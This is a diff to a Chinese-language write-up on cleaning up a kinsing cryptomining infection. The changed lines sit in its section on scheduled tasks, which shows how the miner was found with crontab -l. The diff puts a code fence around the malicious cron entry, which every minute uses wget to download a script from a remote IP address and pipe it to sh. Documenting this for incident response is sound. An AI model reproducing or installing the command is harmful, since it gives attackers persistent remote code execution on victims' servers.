@@ -116,7 +116,9 @@ kinsing67 27584  www   30u  IPv4 17568242      0t0      TCP iZbp15pf7sr2cgwbyqi1
 ## 4.定时任务
 挖矿脚本大概率定时在你的crontab里面。
 crontab -l 发现定时任务
+```shell
 * * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+```
 
 ## 参考
 [Linux Redis自动化挖矿感染蠕虫分析及安全建议](https://paper.seebug.org/605/)
